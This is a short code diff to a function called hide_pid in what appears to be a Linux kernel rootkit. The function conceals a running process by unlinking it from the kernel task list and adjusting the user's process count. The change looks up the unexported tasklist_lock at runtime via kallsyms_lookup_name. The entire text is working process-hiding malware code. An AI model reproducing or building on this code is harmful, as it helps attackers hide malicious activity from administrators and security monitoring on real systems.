@@ -69,6 +69,7 @@ hide_pid(pid_t pid)
     add_pid_to_list(hidden_pids_tail, pid);
 
     struct task_struct *ts = pid_task(find_vpid(pid), PIDTYPE_PID);
+    rwlock_t *rwlock = (rwlock_t *)kallsyms_lookup_name("tasklist_lock");
 
     if (!ts)
         return;
@@ -77,9 +78,9 @@ hide_pid(pid_t pid)
     atomic_dec(&__task_cred(ts)->user->processes);
     rcu_read_unlock();
 
-	write_lock_irq(&tasklist_lock);
+	write_lock_irq(rwlock);
     list_del(&ts->tasks);
-    write_unlock_irq(&tasklist_lock);
+    write_unlock_irq(rwlock);
 }
 
 void
